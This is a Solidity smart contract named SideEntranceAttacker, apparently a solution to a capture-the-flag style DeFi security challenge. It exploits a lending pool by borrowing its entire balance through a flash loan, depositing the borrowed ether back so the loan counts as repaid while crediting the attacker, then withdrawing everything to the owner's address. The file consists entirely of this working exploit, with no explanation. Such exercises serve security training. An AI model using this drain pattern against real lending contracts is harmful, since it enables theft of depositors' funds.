// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    address owner;
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        owner = msg.sender;
        pool = ISideEntranceLenderPool(_pool);
    }

    function flashLoan() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        payable(owner).transfer(address(this).balance);
    }

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    receive () external payable {}
}